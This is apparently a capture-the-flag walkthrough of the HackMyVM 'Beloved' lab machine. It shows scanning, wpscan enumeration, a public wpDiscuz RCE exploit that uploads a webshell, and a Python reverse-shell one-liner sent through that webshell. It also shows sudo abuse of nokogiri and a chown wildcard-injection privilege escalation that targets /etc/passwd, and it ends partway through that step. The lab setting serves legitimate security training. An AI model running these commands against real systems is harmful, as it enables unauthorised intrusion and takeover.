---
layout: post
title: "HackMyVM - Beloved"
date: 2021-06-30 01:49:00 +0100
categories: hmv
tag: ["WordPress", "RCE", "Wildcard"]
---
# HackMyVM > BELOVED

Creator: [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
Level: Easy
Release Date: 2021-06-29

## Scan

```bash
$ nmap -sC -sV -p- 192.168.1.11
Starting Nmap 7.92 ( https://nmap.org ) at 2021-06-30 01:49 WEST
Nmap scan report for 192.168.1.11
Host is up (0.00025s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d (RSA)
|   256 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a (ECDSA)
|_  256 85:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.7.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Beloved &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.30 seconds
```

```
$ sudo nano /etc/hosts  
192.168.1.11     beloved
```

## Wordpress Enumeration

```bash
$ wpscan --url http://beloved --api-token <TOKEN> --enumerate p,u --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://beloved/ [192.168.1.11]

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://beloved/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://beloved/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://beloved/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://beloved/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://beloved/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Rss Generator (Passive Detection)
 |  - http://beloved/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>
 |  - http://beloved/comments/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>
 |
 | [!] 10 vulnerabilities identified:
 |
 | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update
 |     Fixed in: 5.7.3
 |     References:
 |      - https://wpscan.com/vulnerability/5d6789db-e320-494b-81bb-e678674f4199
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/lodash/lodash/wiki/Changelog
 |      - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689
 |
 | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
 |     Fixed in: 5.7.3
 |     References:
 |      - https://wpscan.com/vulnerability/5b754676-20f5-4478-8fd3-6bc383145811
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v
 |
 | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API
 |     Fixed in: 5.7.3
 |     References:
 |      - https://wpscan.com/vulnerability/38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5
 |
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 |     Fixed in: 5.7.4
 |     References:
 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
 |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/54207
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 5.7.5
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 5.7.5
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 5.7.5
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 5.7.5
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 5.7.6
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |
 | [!] Title: WordPress < 5.9.2 / Gutenberg < 12.7.2 - Prototype Pollution via Gutenberg’s wordpress/url package
 |     Fixed in: 5.7.6
 |     References:
 |      - https://wpscan.com/vulnerability/6e61b246-5af1-4a4f-9ca8-a8c87eb2e499
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |      - https://github.com/WordPress/gutenberg/pull/39365/files

[+] WordPress theme in use: twentytwentyone
 | Location: http://beloved/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://beloved/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | Style URL: http://beloved/wp-content/themes/twentytwentyone/style.css?ver=1.3
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://beloved/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Most Popular Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:30 <=====================================================================================> (1500 / 1500) 100.00% Time: 00:01:30
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://beloved/wp-content/plugins/akismet/
 | Latest Version: 4.2.4
 | Last Updated: 2022-05-20T09:58:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://beloved/wp-content/plugins/akismet/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[+] wpdiscuz
 | Location: http://beloved/wp-content/plugins/wpdiscuz/
 | Last Updated: 2022-03-30T20:00:00.000Z
 | Readme: http://beloved/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.3.17
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://beloved/wp-content/plugins/wpdiscuz/, status: 200
 |
 | [!] 4 vulnerabilities identified:
 |
 | [!] Title: Comments - wpDiscuz 7.0.0 - 7.0.4 - Unauthenticated Arbitrary File Upload
 |     Fixed in: 7.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/92ae2765-dac8-49dc-a361-99c799573e61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24186
 |      - https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/
 |      - https://plugins.trac.wordpress.org/changeset/2345429/wpdiscuz
 |
 | [!] Title: Comments - wpDiscuz < 7.3.2 - Admin+ Stored Cross-Site Scripting
 |     Fixed in: 7.3.2
 |     References:
 |      - https://wpscan.com/vulnerability/f51a350c-c46d-4d52-b787-762283625d0b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24737
 |
 | [!] Title: wpDiscuz < 7.3.4 - Arbitrary Comment Addition/Edition/Deletion via CSRF
 |     Fixed in: 7.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/2746101e-e993-42b9-bd6f-dfd5544fa3fe
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24806
 |      - https://www.youtube.com/watch?v=CL7Bttu2W-o
 |
 | [!] Title: wpDiscuz < 7.3.12 - Sensitive Information Disclosure
 |     Fixed in: 7.3.12
 |     References:
 |      - https://wpscan.com/vulnerability/027e6ef8-39d8-4fa9-957f-f53ee7175c0a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23984
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://beloved/wp-content/plugins/wpdiscuz/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=========================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] smart_ass
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://beloved/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://beloved/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 71

[+] Requests Done: 1575
[+] Cached Requests: 12
[+] Data Sent: 406.703 KB
[+] Data Received: 18.988 MB
[+] Memory used: 203.305 MB
[+] Elapsed time: 00:01:43
```

## [WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)](https://www.exploit-db.com/exploits/49967)

```bash
$ searchsploit wpDiscuz
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)                                                           | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)                                                           | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Upload (Metasploit)                                                | php/webapps/49401.rb
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

```bash
$ python3 49967.py -u http://192.168.1.11 -p /2021/06/30/hello-world
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[50432] | code:[200]
[!] Got wmuSecurity value: efe9ea7867
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: kugslpkotbncuzj

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://beloved/wp-content/uploads/2021/06/kugslpkotbncuzj-1654900894.7926.php&quot; 
```

```
http://beloved/wp-content/uploads/2021/06/kugslpkotbncuzj-1654900894.7926.php?cmd=id
```

<img src="https://drive.google.com/uc?id=1oUZN626wJynvulEARCtXQQk6BhVczKhZ"/>

## Reverse Shell

```python
http://beloved/wp-content/uploads/2021/06/kugslpkotbncuzj-1654900894.7926.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.6",9001));os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

```bash
$ python3 -m pwncat -lp 9001
[03:44:56] Welcome to pwncat 🐈!                                                                                                                       __main__.py:164
[03:46:46] received connection from 192.168.1.11:34176                                                                                                      bind.py:84
[03:46:47] 192.168.1.11:34176: registered new host w/ db                                                                                                manager.py:957
(local) pwncat$                                                                                                                                                       
(remote) www-data@beloved:/var/www/html/wordpress/wp-content/uploads/2022/06$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@beloved:/var/www/html/wordpress/wp-content/uploads/2022/06$
```

## Lateral Movement with Nokogiri (www>beloved)

```bash
(remote) www-data@beloved:/var/www/html/wordpress/wp-admin$ cd /var/www
(remote) www-data@beloved:/var/www$ ls -la
total 16
drwxr-xr-x  3 www-data www-data 4096 Jun 27  2021 .
drwxr-xr-x 12 root     root     4096 Jun  8  2021 ..
-rw-------  1 www-data www-data  153 Jun 27  2021 .bash_history
drwxr-xr-x  3 www-data www-data 4096 Jun  9  2021 html
(remote) www-data@beloved:/var/www$ cat .bash_history 
stty rows 57 cols 236
export TERM=xterm
clear
sudo -l
sudo -u beloved /usr/local/bin/nokogiri --help
sudo -u beloved /usr/local/bin/nokogiri /etc/passwd
(remote) www-data@beloved:/var/www$ 
(remote) www-data@beloved:/var/www$ sudo -u beloved /usr/local/bin/nokogiri /etc/passwd
Your document is stored in @doc...
irb(main):001:0> system 'id'
uid=1000(beloved) gid=1000(beloved) groups=1000(beloved)
=> true
irb(main):002:0> system '/bin/bash'
beloved@beloved:/var/www$ id
uid=1000(beloved) gid=1000(beloved) groups=1000(beloved)
beloved@beloved:/var/www$ 
```

## ROOT

```bash
beloved@beloved:~$ cat .bash_history 
clear
id
clear
wget http://192.168.0.28:8000/pspy64
cd ~
wget http://192.168.0.28:8000/pspy64
chmod +x *
clear
./pspy64 |grep "UID=0"
clear
cd /opt
clear
ls -l
cat id_rsa 
clear
touch test && touch -- --reference=test
clear
watch ls -l
clear
cat id_rsa 
cd ~
nano id_rsa
chmod 600 id_rsa 
clear
ssh -i id_rsa root@localhost 
```

```bash
beloved@beloved:/opt$ 
(local) pwncat$ upload /media/adok/SSD2/opt/enum/pspy64
./pspy64 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 3.1/3.1 MB • 1.5 MB/s • 0:00:00
[04:04:34] uploaded 3.08MiB in 2.34 seconds                                                                                                                upload.py:76
(local) pwncat$                                                                                                                                                        
(remote) beloved@beloved:/opt$ chmod +x pspy64
(remote) beloved@beloved:/opt$ 
```

### [CHOWN Wildcard Injection](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/)

```bash
2021/09/30 04:58:53 CMD: UID=0    PID=1      | /sbin/init 
2021/09/30 04:59:01 CMD: UID=0    PID=885    | /usr/sbin/CRON -f 
2021/09/30 04:59:01 CMD: UID=0    PID=886    | /usr/sbin/CRON -f 
2021/09/30 04:59:01 CMD: UID=0    PID=887    | /bin/sh -c cd /opt && chown root:root * 
```

```bash
(remote) beloved@beloved:/opt$ touch reference
(remote) beloved@beloved:/opt$ touch -- --reference=reference
(remote) beloved@beloved:/opt$ ln -s /etc/passwd 
(remote) beloved@beloved:/opt$ openssl passwd -1 123123 
$1$rjmx20dw$6J0UKP9xNKkCjNPPOeCob/
```
